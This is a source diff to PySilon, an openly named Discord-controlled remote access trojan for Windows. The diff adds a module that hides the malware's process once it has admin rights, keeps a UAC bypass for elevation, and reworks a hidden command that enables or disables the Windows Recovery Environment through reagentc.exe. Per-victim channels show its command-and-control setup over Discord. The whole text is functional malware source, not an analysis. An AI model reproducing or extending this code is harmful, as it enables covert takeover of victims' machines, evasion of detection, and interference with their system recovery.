@@ -1,4 +1,5 @@
 import os
+import sys
 import json
 import ctypes
 import discord
@@ -8,6 +9,7 @@ from discord.ext import commands
 from urllib.request import urlopen
 import resources.modules.misc as pysilon_misc
 import resources.modules.uac_bypass as uac_bypass
+import resources.modules.hideProcess as proc_hider
 import resources.modules.protections as pysilon_protections
 
 def IsAdmin() -> bool:
@@ -23,8 +25,11 @@ if not IsAdmin():
     if uac_bypass.GetSelf()[1]:
         if uac_bypass.UACbypass():
             os._exit(0)
+else:
+    proccess_was_hidden = False #! will be used later
+    if proc_hider.hide_process(): proccess_was_hidden = True
 
-client = commands.Bot(command_prefix=['.'], intents=discord.Intents.all(), case_insensitive=True)
+client = commands.Bot(command_prefix=['.'], intents=discord.Intents.all())
 
 bot_token = ""
 guild_ids = []
@@ -68,6 +73,7 @@ async def on_ready():
     
     if not first_run:
         working_directory = fetch_working_dir()
+        if working_directory == None or working_directory == []: working_directory = [os.getenv('SystemDrive'), "Users", getuser()]; save_working_dir()
         category_channel_names = []
         for channel in category.channels:
             category_channel_names.append(channel.name)
@@ -81,7 +87,7 @@ async def on_ready():
             channel_ids['voice'] = temp.id
 
     if first_run:
-        working_directory = ["C:", "Users", getuser()]; save_working_dir()
+        working_directory = [os.getenv('SystemDrive'), "Users", getuser()]; save_working_dir()
         category = await client.get_guild(guild_id).create_category(hwid)
         temp = await client.get_guild(guild_id).create_text_channel('info', category=category); channel_ids['info'] = temp.id
         temp = await client.get_guild(guild_id).create_text_channel('main', category=category); channel_ids['main'] = temp.id
@@ -116,12 +122,17 @@ async def on_ready():
 
 def fetch_working_dir():
     global working_directory
-    with open('resources/configs/working_directory.json', 'r') as fetch_dir:
-        working_directory = json.load(fetch_dir)
+    try:
+        with open(f'{os.path.dirname(sys.executable)}\\working_directory.json', 'r') as fetch_dir:
+            working_directory = json.load(fetch_dir)
+    except: 
+        save_working_dir()
+        working_directory = [os.getenv('SystemDrive'), "Users", getuser()]
     return working_directory
+
 def save_working_dir():
     global working_directory
-    with open('resources/configs/working_directory.json', 'w') as save_dir:
+    with open(f'{os.path.dirname(sys.executable)}\\working_directory.json', 'a') as save_dir:
         json.dump(working_directory, save_dir)
 
 @client.event
@@ -153,28 +164,20 @@ async def delete_category(ctx,  argument=None, password=None):
     else: 
         await ctx.send("```Improper arguments. \n\nUsage: .implode <normal / full> <password>```")
 
-@client.commanc(name="reset")
+@client.command(name="re-agent")
 async def reset_agentc_handler(ctx, argument=None):
-    if argument == "block":
-        await ctx.message.delete()
+    await ctx.message.delete()
+    if argument not in ['enable', 'disable']: 
+        embed = discord.Embed(title="📛 Error",description=f'```Syntax: .re-agent <enable/disable>```', colour=discord.Colour.red())
+        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+        return await ctx.send(embed=embed)
+    else:
         if IsAdmin():
-            subprocess.run('reagentc.exe /disable', creationflags=subprocess.CREATE_NO_WINDOW)
-            embed = discord.Embed(title="🟣 System",description=f'```Successfully disabled REAgentC.```', colour=discord.Colour.purple())
+            subprocess.run('reagentc.exe /' + argument, creationflags=subprocess.CREATE_NO_WINDOW)
+            embed = discord.Embed(title="🟣 System",description=f'```Successfully {argument}d REAgentC.```', colour=discord.Colour.purple())
             embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
-            reaction_msg = await ctx.send(embed=embed); await reaction_msg.add_reaction('🔴')
+            await ctx.send(embed=embed)
         else:
-            embed = discord.Embed(title="📛 Error",description=f'```Disabling REAgentC requires elevation.```', colour=discord.Colour.purple())
+            embed = discord.Embed(title="📛 Error",description=f'```This command requires (UAC) elevation.```', colour=discord.Colour.red())
             embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
-            reaction_msg = await ctx.send(embed=embed); await reaction_msg.add_reaction('🔴')
-    elif argument == "unblock":
-        await ctx.message.delete()
-        if IsAdmin():
-            subprocess.run('reagentc.exe /enable', creationflags=subprocess.CREATE_NO_WINDOW)
-            embed = discord.Embed(title="🟣 System",description=f'```Successfully enabled REAgentC.```', colour=discord.Colour.purple())
-            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
-            reaction_msg = await ctx.send(embed=embed); await reaction_msg.add_reaction('🔴')
-        else:
-            embed = discord.Embed(title="📛 Error",description=f'```Enabling REAgentC requires elevation.```', colour=discord.Colour.purple())
-            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
-            reaction_msg = await ctx.send(embed=embed); await reaction_msg.add_reaction('🔴')
-    else: ctx.send("The **reset** command should be followed by **block** or ***unvloxk**")
+            await ctx.send(embed=embed)
